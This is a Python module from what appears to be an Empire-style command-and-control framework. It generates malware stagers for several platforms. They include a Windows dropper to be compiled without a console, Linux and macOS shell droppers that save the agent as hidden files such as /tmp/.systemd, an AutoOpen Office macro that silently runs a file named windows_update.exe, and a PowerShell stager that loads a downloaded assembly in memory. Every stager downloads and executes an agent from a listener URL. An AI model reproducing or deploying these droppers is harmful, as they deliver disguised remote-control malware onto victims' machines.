# kush-framework/kush/core/stager_manager.py
"""
Stager manager for Empire-style stagers
"""

import os
import base64
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Any
from colorama import Fore, Style

class StagerManager:
    def __init__(self):
        self.stagers: Dict[str, Any] = {}
        self.stager_options: Dict[str, Dict[str, Any]] = {}
        
        # Load built-in stagers
        self._load_builtin_stagers()
    
    def _load_builtin_stagers(self):
        """Load built-in stagers"""
        # Windows Dropper
        self.stagers['windows_dropper'] = {
            'name': 'windows_dropper',
            'description': 'Windows executable that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.exe'},
            ]
        }
        
        # Windows Macro
        self.stagers['windows_macro'] = {
            'name': 'windows_macro',
            'description': 'Office macro that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'macro.vba'},
            ]
        }
        
        # Linux Dropper
        self.stagers['linux_dropper'] = {
            'name': 'linux_dropper',
            'description': 'Linux ELF binary that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.elf'},
            ]
        }
        
        # macOS Dropper
        self.stagers['macos_dropper'] = {
            'name': 'macos_dropper',
            'description': 'macOS Mach-O binary that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'payload.macho'},
            ]
        }
        
        # PowerShell Stager
        self.stagers['powershell'] = {
            'name': 'powershell',
            'description': 'PowerShell script that downloads and executes agent',
            'author': 'Kush Team',
            'options': [
                {'name': 'Listener', 'description': 'Listener to use', 'required': True},
                {'name': 'OutFile', 'description': 'Output file name', 'required': False, 'default': 'stager.ps1'},
            ]
        }
        
        # Initialize options
        for stager_name in self.stagers:
            self.stager_options[stager_name] = {}
            for option in self.stagers[stager_name]['options']:
                self.stager_options[stager_name][option['name']] = option.get('default', '')
    
    def get_stagers(self) -> List[Dict[str, Any]]:
        """Get all available stagers"""
        return list(self.stagers.values())
    
    def get_stager(self, stager_name: str) -> Optional[Dict[str, Any]]:
        """Get specific stager"""
        return self.stagers.get(stager_name)
    
    def set_option(self, stager_name: str, option: str, value: str) -> bool:
        """Set stager option"""
        if stager_name not in self.stager_options:
            return False
        
        self.stager_options[stager_name][option] = value
        return True
    
    def get_option(self, stager_name: str, option: str) -> Optional[str]:
        """Get stager option value"""
        if stager_name not in self.stager_options:
            return None
        return self.stager_options[stager_name].get(option)
    
    def generate_stager(self, stager_name: str) -> Optional[str]:
        """Generate a stager"""
        if stager_name not in self.stagers:
            return None
        
        options = self.stager_options[stager_name]
        listener_name = options.get('Listener')
        out_file = options.get('OutFile', 'payload.exe')
        
        if not listener_name:
            print(f"{Fore.RED}[-] Listener not specified{Style.RESET_ALL}")
            return None
        
        # Create stagers directory
        stagers_dir = Path("stagers")
        stagers_dir.mkdir(exist_ok=True)
        
        output_path = stagers_dir / out_file
        
        try:
            if stager_name == 'windows_dropper':
                return self._generate_windows_dropper(output_path, listener_name)
            elif stager_name == 'linux_dropper':
                return self._generate_linux_dropper(output_path, listener_name)
            elif stager_name == 'macos_dropper':
                return self._generate_macos_dropper(output_path, listener_name)
            elif stager_name == 'windows_macro':
                return self._generate_windows_macro(output_path, listener_name)
            elif stager_name == 'powershell':
                return self._generate_powershell(output_path, listener_name)
            else:
                return None
                
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to generate stager: {e}{Style.RESET_ALL}")
            return None
    
    def _generate_windows_dropper(self, output_path: Path, listener_name: str) -> str:
        """Generate Windows dropper executable"""
        # Create a simple Python script that would be compiled to exe
        content = f'''#!/usr/bin/env python3
# Windows Dropper for Kush Framework
# Listener: {listener_name}

import os
import sys
import requests
import subprocess
import tempfile

def main():
    try:
        # Download agent from listener
        response = requests.get("http://localhost:8080/agent.exe", timeout=30)
        
        # Save to temp directory
        temp_dir = tempfile.gettempdir()
        agent_path = os.path.join(temp_dir, "windows_update.exe")
        
        with open(agent_path, "wb") as f:
            f.write(response.content)
        
        # Execute agent
        subprocess.Popen([agent_path], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception as e:
        pass

if __name__ == "__main__":
    main()
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        print(f"{Fore.YELLOW}[!] Note: This is a Python script. Compile to EXE using PyInstaller:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] pyinstaller --onefile --noconsole {output_path}{Style.RESET_ALL}")
        
        return str(output_path)
    
    def _generate_linux_dropper(self, output_path: Path, listener_name: str) -> str:
        """Generate Linux dropper executable"""
        content = f'''#!/bin/bash
# Linux Dropper for Kush Framework
# Listener: {listener_name}

# Download and execute agent
curl -s http://localhost:8080/agent.elf -o /tmp/.systemd
chmod +x /tmp/.systemd
/tmp/.systemd &
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        # Make executable
        os.chmod(output_path, 0o755)
        
        return str(output_path)
    
    def _generate_macos_dropper(self, output_path: Path, listener_name: str) -> str:
        """Generate macOS dropper executable"""
        content = f'''#!/bin/bash
# macOS Dropper for Kush Framework  
# Listener: {listener_name}

# Download and execute agent
curl -s http://localhost:8080/agent.macho -o /tmp/.coreservices
chmod +x /tmp/.coreservices
/tmp/.coreservices &
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        # Make executable
        os.chmod(output_path, 0o755)
        
        return str(output_path)
    
    def _generate_windows_macro(self, output_path: Path, listener_name: str) -> str:
        """Generate Windows Office macro"""
        content = f'''Sub AutoOpen()
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
    xHttp.Open "GET", "http://localhost:8080/agent.exe", False
    xHttp.Send
    
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile "C:\\Windows\\Temp\\windows_update.exe", 2
    End With
    
    CreateObject("Wscript.Shell").Run "C:\\Windows\\Temp\\windows_update.exe", 0, False
End Sub
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        return str(output_path)
    
    def _generate_powershell(self, output_path: Path, listener_name: str) -> str:
        """Generate PowerShell stager"""
        content = f'''# PowerShell Stager for Kush Framework
# Listener: {listener_name}

$webClient = New-Object System.Net.WebClient
$payload = $webClient.DownloadData("http://localhost:8080/agent.exe")
$assembly = [System.Reflection.Assembly]::Load($payload)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
'''
        
        with open(output_path, 'w') as f:
            f.write(content)
        
        return str(output_path)